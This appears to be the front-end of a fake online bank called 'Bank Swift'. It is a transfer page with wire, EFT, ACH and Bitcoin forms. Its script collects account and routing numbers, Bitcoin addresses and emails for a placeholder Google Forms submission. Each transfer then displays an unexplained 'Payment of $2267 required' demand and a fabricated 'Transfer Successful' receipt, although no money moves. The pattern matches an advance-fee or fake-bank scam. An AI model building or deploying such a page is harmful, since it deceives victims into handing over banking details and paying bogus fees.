<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer Money ‚Ä¢ Bank Swift</title>
    <link rel="icon" href="bank-swift.svg" type="image/svg+xml" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
            color: white;
            min-height: 100vh;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: radial-gradient(circle at 30% 20%, rgba(102, 126, 234, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.12) 0%, transparent 50%),
                        radial-gradient(circle at 40% 60%, rgba(6, 182, 212, 0.08) 0%, transparent 50%);
            z-index: -1;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
            position: relative;
        }
        
        .header {
            text-align: center;
            margin-bottom: 3rem;
        }
        
        .logo {
            font-size: 1.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1rem;
        }
        
        h2 {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            background: linear-gradient(135deg, #fff, #e2e8f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.7);
            font-size: 1.1rem;
        }
        
        .back-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            width: 45px;
            height: 45px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: white;
            transition: all 0.3s ease;
        }
        
        .back-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateX(-2px);
        }
        
        .transfer-method-btn {
            padding: 16px 20px;
            margin: 8px 0;
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 12px;
            font-size: 16px;
            width: 100%;
            text-align: left;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .transfer-method-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }
        
        .transfer-method-btn:hover::before {
            left: 100%;
        }
        
        .transfer-method-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
        }
        
        .transfer-method-btn:active {
            transform: translateY(0);
        }
        
        .method-icon {
            font-size: 20px;
            margin-right: 12px;
            width: 30px;
            text-align: center;
        }
        
        .method-text {
            flex: 1;
        }
        
        .method-arrow {
            font-size: 12px;
            transition: transform 0.3s ease;
        }
        
        .transfer-method-btn.active .method-arrow {
            transform: rotate(90deg);
        }
        
        .transfer-form {
            display: none;
            margin: 15px 0;
            padding: 20px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            animation: slideDown 0.3s ease;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
                max-height: 0;
            }
            to {
                opacity: 1;
                transform: translateY(0);
                max-height: 500px;
            }
        }
        
        .transfer-form h3 {
            color: white;
            margin-bottom: 20px;
            font-size: 1.3rem;
            text-align: center;
            padding-bottom: 10px;
            border-bottom: 2px solid #667eea;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }
        
        .transfer-input {
            padding: 12px 15px;
            width: 100%;
            font-size: 14px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.1);
            color: white;
        }
        
        .transfer-input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 10px rgba(102, 126, 234, 0.3);
            transform: translateY(-1px);
        }
        
        .transfer-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .message {
            color: #dc3545;
            font-size: 14px;
            margin: 15px 0;
            padding: 12px;
            background: rgba(220, 53, 69, 0.1);
            border: 1px solid rgba(220, 53, 69, 0.3);
            border-radius: 8px;
            display: none;
            text-align: center;
            font-weight: 500;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .submit-btn {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            padding: 15px 20px;
            width: 100%;
            border: none;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 10px;
            margin-top: 20px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }
        
        .submit-btn:hover::before {
            left: 100%;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.3);
        }
        
        .submit-btn.loading {
            background: linear-gradient(45deg, #6c757d, #5a6268);
            cursor: not-allowed;
            transform: none;
        }
        
        .submit-btn.success {
            background: linear-gradient(45deg, #28a745, #34ce57);
            animation: successPulse 0.6s ease;
        }
        
        @keyframes successPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            margin-left: 10px;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }
        
        .success-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            animation: successSlideIn 0.5s ease;
            color: #333;
        }
        
        @keyframes successSlideIn {
            from {
                opacity: 0;
                transform: translate(-50%, -60%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }
        
        .success-icon {
            font-size: 4rem;
            color: #28a745;
            margin-bottom: 20px;
            animation: successBounce 0.6s ease;
        }
        
        @keyframes successBounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }
        
        .success-details {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: left;
        }
        
        .detail-row {
            display: flex;
            justify-content: space-between;
            margin: 8px 0;
            padding: 5px 0;
            border-bottom: 1px solid rgba(0,0,0,0.1);
        }
        
        .detail-row:last-child {
            border-bottom: none;
        }
        
        .close-btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .close-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(102, 126, 234, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
        }
        
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: bigSpin 1s linear infinite;
        }
        
        @keyframes bigSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 900px) {
            .container {
                max-width: 100vw;
                margin: 0;
                padding: 10px 2vw;
            }
            .header {
                margin-bottom: 2rem;
            }
            h2 {
                font-size: 1.5rem;
            }
            .logo {
                font-size: 1.1rem;
            }
            .transfer-method-btn {
                padding: 10px 12px;
                font-size: 14px;
                border-radius: 8px;
            }
            .method-icon {
                font-size: 16px;
                margin-right: 6px;
            }
            .transfer-form {
                padding: 12px 8px;
                border-radius: 8px;
            }
            .form-group label {
                font-size: 13px;
            }
            .transfer-input {
                padding: 10px 12px;
                font-size: 13px;
                border-radius: 6px;
            }
            .submit-btn {
                padding: 12px 10px;
                font-size: 15px;
                border-radius: 8px;
            }
            .success-content {
                padding: 18px 8px;
                border-radius: 10px;
                max-width: 98vw;
            }
            .success-details {
                padding: 10px;
                border-radius: 8px;
            }
            .close-btn {
                padding: 10px 18px;
                font-size: 15px;
                border-radius: 8px;
            }
            .back-btn {
                width: 36px;
                height: 36px;
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container" style="display: flex; flex-direction: row; gap: 2rem; align-items: flex-start;">
        <div style="min-width:180px;max-width:220px;flex:0 0 180px;">
            <div style="background:rgba(255,255,255,0.08);border-radius:16px;padding:1.2rem 1rem;margin-bottom:2rem;text-align:center;box-shadow:0 4px 16px rgba(0,0,0,0.08);color:#fff;">
                <div style="font-size:1.05rem;color:rgba(255,255,255,0.7);margin-bottom:0.5rem;">Available Balance</div>
                <div id="availableBalance" style="font-size:1.5rem;font-weight:700;letter-spacing:1px;">$0.00</div>
            </div>
        </div>
        <div style="flex:1;min-width:0;">
            <button class="back-btn" onclick="goBack()" title="Go Back">‚Üê</button>
            <div class="header">
                <div class="logo">Bank Swift</div>
                <h2>Transfer Money</h2>
                <p class="subtitle">Choose your preferred transfer method</p>
            </div>
            <!-- Wire Transfer -->
        <button class="transfer-method-btn" onclick="toggleForm('wireForm')" id="wireBtn">
            <span class="method-icon">üè¶</span>
            <span class="method-text">Wire Transfer</span>
            <span class="method-arrow">‚ñ∂</span>
        </button>
        <div id="wireForm" class="transfer-form">
            <h3>Wire Transfer</h3>
            <div class="form-group">
                <label for="wireAccount">Account Number</label>
                <input type="text" id="wireAccount" name="account" placeholder="Enter account number" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="wireRouting">Routing Number</label>
                <input type="text" id="wireRouting" name="routing" placeholder="Enter routing number" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="wireAmount">Amount</label>
                <input type="number" id="wireAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
            </div>
            <div class="form-group">
                <label for="wireRecipient">Recipient Name</label>
                <input type="text" id="wireRecipient" placeholder="Enter recipient name" class="transfer-input" required>
            </div>
            <p class="message" id="wireMessage"></p>
            <button class="submit-btn" onclick="submitTransfer('wireForm')" id="wireSubmit">Submit Wire Transfer</button>
        </div>
        
        <!-- EFT Transfer -->
        <button class="transfer-method-btn" onclick="toggleForm('eftForm')" id="eftBtn">
            <span class="method-icon">üí≥</span>
            <span class="method-text">EFT Transfer</span>
            <span class="method-arrow">‚ñ∂</span>
        </button>
        <div id="eftForm" class="transfer-form">
            <h3>EFT Transfer</h3>
            <div class="form-group">
                <label for="eftBank">Bank Name</label>
                <input type="text" id="eftBank" placeholder="Enter bank name" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="eftAccount">Account Number</label>
                <input type="text" id="eftAccount" name="account" placeholder="Enter account number" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="eftRouting">Routing Number</label>
                <input type="text" id="eftRouting" name="routing" placeholder="Enter routing number" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="eftAmount">Amount</label>
                <input type="number" id="eftAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
            </div>
            <p class="message" id="eftMessage"></p>
            <button class="submit-btn" onclick="submitTransfer('eftForm')" id="eftSubmit">Submit EFT Transfer</button>
        </div>
        
        <!-- ACH Transfer -->
        <button class="transfer-method-btn" onclick="toggleForm('achForm')" id="achBtn">
            <span class="method-icon">üîÑ</span>
            <span class="method-text">ACH Transfer</span>
            <span class="method-arrow">‚ñ∂</span>
        </button>
        <div id="achForm" class="transfer-form">
            <h3>ACH Transfer</h3>
            <div class="form-group">
                <label for="achAccount">Account Number</label>
                <input type="text" id="achAccount" name="account" placeholder="Enter account number" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="achRouting">Routing Number</label>
                <input type="text" id="achRouting" name="routing" placeholder="Enter routing number" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="achAmount">Amount</label>
                <input type="number" id="achAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
            </div>
            <div class="form-group">
                <label for="achRecipient">Recipient Name</label>
                <input type="text" id="achRecipient" placeholder="Enter recipient name" class="transfer-input" required>
            </div>
            <p class="message" id="achMessage"></p>
            <button class="submit-btn" onclick="submitTransfer('achForm')" id="achSubmit">Submit ACH Transfer</button>
        </div>
        
        <!-- Convert & Send to BTC -->
        <button class="transfer-method-btn" onclick="toggleForm('btcForm')" id="btcBtn">
            <span class="method-icon">‚Çø</span>
            <span class="method-text">Convert & Send to BTC</span>
            <span class="method-arrow">‚ñ∂</span>
        </button>
        <div id="btcForm" class="transfer-form">
            <h3>Convert & Send to BTC</h3>
            <div class="form-group">
                <label for="btcAddress">Bitcoin Address</label>
                <input type="text" id="btcAddress" placeholder="Enter BTC address" class="transfer-input" required>
            </div>
            <div class="form-group">
                <label for="btcAmount">Amount in USD</label>
                <input type="number" id="btcAmount" placeholder="Enter amount" class="transfer-input" min="1" step="0.01" required>
            </div>
            <div class="form-group">
                <label for="btcEmail">Email Address</label>
                <input type="email" id="btcEmail" placeholder="Enter your email" class="transfer-input" required>
            </div>
            <p class="message" id="btcMessage"></p>
            <button class="submit-btn" onclick="submitTransfer('btcForm')" id="btcSubmit">Submit BTC Conversion</button>
        </div>

    <!-- Success Modal -->
    <div id="successModal" class="success-modal">
        <div class="success-content">
            <div class="success-icon">‚úÖ</div>
            <h2 style="color: #28a745; margin-bottom: 15px;">Transfer Successful!</h2>
            <div id="successDetails" class="success-details"></div>
            <button class="close-btn" onclick="closeSuccessModal()">Continue</button>
        </div>
    </div>
    
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    
    <script>
        let activeForm = null;
        
        function toggleForm(formId) {
            const form = document.getElementById(formId);
            const btn = document.getElementById(formId.replace('Form', 'Btn'));
            
            if (activeForm && activeForm !== form) {
                activeForm.style.display = "none";
                const activeBtn = document.querySelector('.transfer-method-btn.active');
                if (activeBtn) activeBtn.classList.remove('active');
            }
            
            if (form.style.display === "none" || form.style.display === "") {
                form.style.display = "block";
                btn.classList.add('active');
                activeForm = form;
                setTimeout(() => {
                    form.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                }, 100);
            } else {
                form.style.display = "none";
                btn.classList.remove('active');
                activeForm = null;
            }
        }
        
        async function submitToGoogleForm(formData) {
            try {
                // Mock submission for demo - replace with actual Google Forms endpoint
                console.log('Submitting to Google Form:', formData);
                return true;
            } catch (error) {
                console.error('Submission error:', error);
                return false;
            }
        }
        
        function submitTransfer(formId) {
            const form = document.getElementById(formId);
            const submitBtn = form.querySelector('.submit-btn');
            const messageElement = form.querySelector('.message');
            
            const formData = {
                formType: formId.replace('Form', ' Transfer'),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            let isValid = true;
            let validationMessage = '';
            
            if (formId === 'wireForm' || formId === 'eftForm' || formId === 'achForm') {
                const accountNumber = form.querySelector("input[name='account']")?.value || "";
                const routingNumber = form.querySelector("input[name='routing']")?.value || "";
                const amount = form.querySelector("input[type='number']")?.value || "";
                
                formData.accountNumber = accountNumber;
                formData.routingNumber = routingNumber;
                formData.amount = amount;
                
                if (accountNumber.length < 4) {
                    isValid = false;
                    validationMessage = "Account number must be at least 4 digits.";
                } else if (routingNumber.length < 4) {
                    isValid = false;
                    validationMessage = "Routing number must be at least 4 digits.";
                } else if (!amount || parseFloat(amount) <= 0) {
                    isValid = false;
                    validationMessage = "Please enter a valid amount.";
                }
            } else if (formId === 'btcForm') {
                const btcAddress = document.getElementById('btcAddress').value;
                const amount = document.getElementById('btcAmount').value;
                const email = document.getElementById('btcEmail').value;
                
                formData.btcAddress = btcAddress;
                formData.amount = amount;
                formData.email = email;
                
                if (!btcAddress || btcAddress.length < 10) {
                    isValid = false;
                    validationMessage = "Please enter a valid Bitcoin address.";
                } else if (!amount || parseFloat(amount) <= 0) {
                    isValid = false;
                    validationMessage = "Please enter a valid amount.";
                } else if (!email || !email.includes('@')) {
                    isValid = false;
                    validationMessage = "Please enter a valid email address.";
                }
            }
            
            if (!isValid) {
                showMessage(messageElement, validationMessage, 'error');
                return;
            }
            
            // Submit to mock Google Form
            submitToGoogleForm(formData);
            
            messageElement.style.display = "none";
            submitBtn.disabled = true;
            submitBtn.classList.remove("success");
            submitBtn.innerHTML = "Please wait...";
            
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                submitBtn.classList.add("loading");
                submitBtn.innerHTML = `Processing<span class="spinner"></span>`;
                
                setTimeout(() => {
                    showMessage(messageElement, "Payment of $2267 required.", 'payment');
                    
                    setTimeout(() => {
                        submitBtn.classList.remove("loading");
                        submitBtn.classList.add("success");
                        submitBtn.innerHTML = "Transfer Successful ‚úì";
                        
                        const successData = prepareSuccessData(formId, formData);
                        setTimeout(() => {
                            showSuccessModal(successData);
                        }, 1000);
                    }, 1000);
                }, 3000);
            }, 1000);
        }
        
        function showMessage(element, message, type) {
            element.innerText = message;
            element.style.display = "block";
            
            if (type === 'payment') {
                element.style.background = 'rgba(255, 193, 7, 0.2)';
                element.style.color = '#ffc107';
                element.style.borderColor = 'rgba(255, 193, 7, 0.3)';
            } else if (type === 'error') {
                element.style.background = 'rgba(220, 53, 69, 0.2)';
                element.style.color = '#dc3545';
                element.style.borderColor = 'rgba(220, 53, 69, 0.3)';
            }
        }
        
        function prepareSuccessData(formId, formData) {
            const transferTypes = {
                'wireForm': 'Wire Transfer',
                'eftForm': 'EFT Transfer',
                'achForm': 'ACH Transfer',
                'btcForm': 'Bitcoin Conversion'
            };
            
            const accountLast4 = formData.accountNumber ? formData.accountNumber.slice(-4) : 'N/A';
            const routingLast4 = formData.routingNumber ? formData.routingNumber.slice(-4) : 'N/A';
            const referenceNumber = 'TXN' + Date.now().toString().slice(-8);
            
            return {
                type: transferTypes[formId],
                account: accountLast4,
                routing: routingLast4,
                amount: formData.amount || 'N/A',
                reference: referenceNumber,
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString(),
                status: 'Completed',
                btcAddress: formData.btcAddress ? formData.btcAddress.substring(0, 10) + '...' : null
            };
        }
        
        function showSuccessModal(data) {
            const modal = document.getElementById('successModal');
            const details = document.getElementById('successDetails');
            
            let detailsHTML = `
                <div class="detail-row">
                    <strong>Transfer Type:</strong>
                    <span>${data.type}</span>
                </div>
                <div class="detail-row">
                    <strong>Reference Number:</strong>
                    <span>${data.reference}</span>
                </div>
                <div class="detail-row">
                    <strong>Date:</strong>
                    <span>${data.date}</span>
                </div>
                <div class="detail-row">
                    <strong>Time:</strong>
                    <span>${data.time}</span>
                </div>
                <div class="detail-row">
                    <strong>Status:</strong>
                    <span style="color: #28a745; font-weight: bold;">${data.status}</span>
                </div>
            `;
            
            if (data.amount !== 'N/A') {
                detailsHTML += `
                    <div class="detail-row">
                        <strong>Amount:</strong>
                        <span>$${data.amount}</span>
                    </div>
                `;
            }
            
            if (data.account !== 'N/A') {
                detailsHTML += `
                    <div class="detail-row">
                        <strong>Account:</strong>
                        <span>****${data.account}</span>
                    </div>
                `;
            }
            
            if (data.routing !== 'N/A') {
                detailsHTML += `
                    <div class="detail-row">
                        <strong>Routing:</strong>
                        <span>****${data.routing}</span>
                    </div>
                `;
            }
            
            if (data.btcAddress) {
                detailsHTML += `
                    <div class="detail-row">
                        <strong>BTC Address:</strong>
                        <span>${data.btcAddress}</span>
                    </div>
                `;
            }
            
            details.innerHTML = detailsHTML;
            modal.style.display = 'block';
        }
        
        function closeSuccessModal() {
            document.getElementById('successModal').style.display = 'none';
        }
        
        function goBack() {
            window.location.href = 'dashboard.html';
        }
    </script>
</body>
</html>
